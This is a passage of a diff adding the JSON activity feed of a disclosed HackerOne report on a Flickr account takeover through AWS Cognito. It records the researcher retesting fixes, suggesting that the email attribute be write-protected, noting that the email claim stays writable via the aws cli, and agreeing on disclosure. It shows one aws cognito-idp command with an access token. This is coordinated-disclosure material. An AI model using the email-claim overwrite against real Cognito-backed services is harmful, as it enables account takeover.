+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13513255,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lauritz care to try reproducing again? We've made a preliminary fix, though there are additional fixes we'll deploy through the next week.",
+      "automated_response": false,
+      "created_at": "2021-09-18T05:12:36.598Z",
+      "updated_at": "2021-09-18T05:12:36.598Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13513606,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexseville,\n\nthe preliminary fix looks good to me for now. I am not able to login using a malicious access token that is crafted as shown before via https://www.flickr.com/signin/auth?data=ey...\n\n{F1452475}\n\nGreat work applying a fix this fast!\n\nHave a nice weekend,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-09-18T06:46:06.393Z",
+      "updated_at": "2021-09-18T06:46:06.393Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1452475,
+          "filename": "temp_fix.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/c96e425vbn8rz38g3pwh591v33ft?response-content-disposition=attachment%3B%20filename%3D%22temp_fix.png%22%3B%20filename%2A%3DUTF-8%27%27temp_fix.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=44d96bdbb8a09004962bfeddfddeea8a8d95d2f161cd46b08be804f64b837107"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13519225,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Great, thanks for the repro, I'll award a $50 bonus for your time.\n\nI'll update the ticket as our remediation items are covered, so for the moment we aren't going to close this issue, but we are prioritizing it highly.\n\nThanks again!",
+      "automated_response": false,
+      "created_at": "2021-09-18T17:53:59.825Z",
+      "updated_at": "2021-09-18T17:53:59.825Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13519234,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Re-test bonus after our initial mitigation patch.",
+      "automated_response": false,
+      "created_at": "2021-09-18T17:54:47.589Z",
+      "updated_at": "2021-09-18T17:54:47.589Z",
+      "actor": {
+        "url": "/flickr",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/032/982/553e2f6c6682ebf04363717b01f5413d6e313e62_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Flickr"
+        }
+      },
+      "bounty_amount": "0.0",
+      "bonus_amount": "50.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "flickr",
+      "collaborator": {
+        "username": "lauritz",
+        "url": "/lauritz"
+      }
+    },
+    {
+      "id": 13620011,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexseville,\n\nI hope you are doing well :)\n\nSince last week I did some research regarding AWS Cognito and noticed, that there are further possible Cognito-specific hardening measures that can be applied.\n\nIt is possible to write-protect user claims, such as the e-mail. If a user would then try to set a new e-mail address, this would result in the following error:\n```\nAn error occurred (InvalidParameterException) when calling the UpdateUserAttributes operation: user.email: Attribute cannot be updated.\n```\n\nDocumentation on this can be found here: https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html#user-pool-settings-attribute-permissions-and-scopes \n\nPlease let me know if I could further assist.\n\nBest regards and have a nice weekend,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-09-24T23:33:01.123Z",
+      "updated_at": "2021-09-24T23:33:01.123Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13819925,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey there,\n\nI would like to request an update on this report. \n\nThanks a lot and best regards,\nLauritz",
+      "automated_response": false,
+      "created_at": "2021-10-08T21:23:43.479Z",
+      "updated_at": "2021-10-08T21:23:43.479Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13819977,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Our final fixes continue to be planned. I don't yet have an ETA on when they will be live, but we will update the ticket at that time.",
+      "automated_response": false,
+      "created_at": "2021-10-08T21:32:31.832Z",
+      "updated_at": "2021-10-08T21:32:31.832Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13823224,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot for the update and have a nice weekend! :) ",
+      "automated_response": false,
+      "created_at": "2021-10-09T08:17:26.697Z",
+      "updated_at": "2021-10-09T08:17:26.697Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14123416,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexseville,\n\nI hope you are doing well! :)\n\nI just wanted to let you know as soon as possible that I would love to publish a blog post on this report after it is resolved - of course only with your permission. The post would be published on my blog https://security.lauritz-holtmann.de.\n\nThere is already a draft for this post that is attached to this comment: {F1499440}{F1499441}\nAs you can see, the draft includes further references to best practices as well as a description on how such issues could be identified. So maybe this helps for your remediation, too.\n\nPlease let me know what you think about this.\n\n\nThank you very much for your effort and best regards,\n@lauritz \n",
+      "automated_response": false,
+      "created_at": "2021-10-31T15:13:04.958Z",
+      "updated_at": "2021-10-31T15:13:04.958Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1499441,
+          "filename": "flickr-account-takeover.md",
+          "type": "text/markdown",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i2jsggsq3mwxlynfnrnotm9c6ozi?response-content-disposition=attachment%3B%20filename%3D%22flickr-account-takeover.md%22%3B%20filename%2A%3DUTF-8%27%27flickr-account-takeover.md&response-content-type=text%2Fmarkdown&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cb4f524bea045e90d539d23d353d43e114254f54588de463ee00ac2aabee2fda"
+        },
+        {
+          "id": 1499440,
+          "filename": "draft_flickr_blog-post.pdf",
+          "type": "application/pdf",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ojc0hs1yewh7olk8tcyrnqajp0if?response-content-disposition=attachment%3B%20filename%3D%22draft_flickr_blog-post.pdf%22%3B%20filename%2A%3DUTF-8%27%27draft_flickr_blog-post.pdf&response-content-type=application%2Fpdf&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3979994f43e791373a88e9904ad7f24bd1d2ab129c0994c0a9cf3203b93f763e"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14171183,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @lauritz ,\n\nThat's a great blog post!\n\nWe're anticipating completing the final fixes early next week. We're happy to consent to disclosure (you can also request it through the H1 interface if you'd like) for this issue, but would like to ask that you could wait until the final fixes are completed. Often when an exploit becomes public, other researchers come to try and test the fix, so we want to be prepared.\n\nThanks again!",
+      "automated_response": false,
+      "created_at": "2021-11-03T20:37:19.062Z",
+      "updated_at": "2021-11-03T20:37:19.062Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14271808,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexseville,\n\nI just wanted to retest this report before coming back to you and noticed that the sign-up appears to be broken at the moment.\n\nIf I register a user, I get the following error message after confirming the e-mail address and performing the initial login: {F1511104}\n\nApparently, the user is not registered at Cognito:\n```bash\n$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVjBKWGljSCtpUDAzWTQ2aGdsMWxENG96Z1BZdWZTVFg2aXNKRGlXaHprPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIxYjIxOWFkNS05OWMyLTQwNjItYjBiOC1mMDkzNGI3YTdlNmEiLCJldmVudF9pZCI6ImE2N2U5NzUyLWNhZDYtNGRjZS1hZTg0LWIwZjczNjI1OWM4ZiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE2MzY2NTQ3NjUsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX2dCaWVDd01jMSIsImV4cCI6MTYzNjY1ODM2NSwiaWF0IjoxNjM2NjU0NzY1LCJqdGkiOiI1NTg1NmIyNi02ZTFjLTQxNmYtODk4Ni03YzY0NGFhZTA0NzYiLCJjbGllbnRfaWQiOiIzY2sxNWExb3Y0ZjBkM285N3ZzM3RiamI1MiIsInVzZXJuYW1lIjoiMWIyMTlhZDUtOTljMi00MDYyLWIwYjgtZjA5MzRiN2E3ZTZhIn0.d_Y2H0qKGkJBCcFkSE6HFWpPT2MuY0yR3ULL29HI_NPG128JAdcZ3PhA6gBzFobQDS0Jx9OjJhHWmtFuJDCggvjiuB9AQoRnokgqSNgtewbXF8LRf3d-P6qFHhgn_kpYSKApqBnElOD_iZvnyyWQ2iim10E-mnOECdJ0k_BTG1a4_uHE1ql4rKkI44eyIKUmTP2Z0K0SvRYcy_8YptIe11o_M5evkYYcN1bUGEPh82hr5rSyIz3nfuKbl94LsM4dFXma6qlixVDIghIsHtsqjT8H5z9dR3L6HCDvH7fgcjXyhqa9KmW7xjaODBFryHYcK71MDyPon0A1t2LXnEn7_Q\n\nAn error occurred (UserNotFoundException) when calling the GetUser operation: User does not exist.\n```\n\nIf you are applying your fixes in this exact moment, ignore this message. Otherwise, the applied fix may have broken sensitive functionality.\n\nDo not hesitate to reach out in case you have any comment or questions!\n\nBest regards,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-11-11T18:27:17.628Z",
+      "updated_at": "2021-11-11T18:27:17.628Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1511104,
+          "filename": "flickr-error.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cq7tot022soq2m58b3t4s1yejrzv?response-content-disposition=attachment%3B%20filename%3D%22flickr-error.png%22%3B%20filename%2A%3DUTF-8%27%27flickr-error.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bdb97c43897fdd4c7dbe3faa481ce95c0537b118e395a83a1a37b815dbe09c69"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14330842,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey there,\n\nI noticed that the registration works again. However, I also noticed that it is still possible to write the `email` claim via the *aws cli*. Is this the final state of fixes and hardening you were referring to two weeks ago, or do you plan to implement further measures to harden the login and registration flow? \nFrom my perspective, the current state behaves comparable to the preliminary fixes applied on September 18th. \n\nThank you very much for your consent regarding the disclosure! :) I will formally request disclosure via the platform once this report is marked as resolved here at H1 (in the current state I do not have this option available).\n\nPlease let me know if I could further assist. \n\nBest regards,\n@lauritz \n\n",
+      "automated_response": false,
+      "created_at": "2021-11-16T23:08:08.776Z",
+      "updated_at": "2021-11-16T23:08:08.776Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14495503,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexseville an team,\n\nI hope this message finds you all well! :)\n\nI am very sorry to bother you again, but would like to request another update. 🙈\nIf the issue is resolved from your side, would you mind adjusting the status on H1? \n\nOtherwise, if you need further time for remediation or have additional comments, please let me know. \n\nThank you very much for your effort and best regards, \n@lauritz",
+      "automated_response": false,
+      "created_at": "2021-11-30T23:14:59.936Z",
+      "updated_at": "2021-11-30T23:14:59.936Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14719556,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "@lauritz sorry for the delay, we are all done with the ticket now! Thanks for your help again!",
+      "automated_response": false,
+      "created_at": "2021-12-17T17:41:44.082Z",
+      "updated_at": "2021-12-17T17:41:44.082Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lauritz",
+        "url": "/lauritz"
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14722317,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Thank you very much @alexseville!\nLet's disclose this report :)",
+      "automated_response": false,
+      "created_at": "2021-12-18T00:23:34.760Z",
+      "updated_at": "2021-12-18T00:23:34.760Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
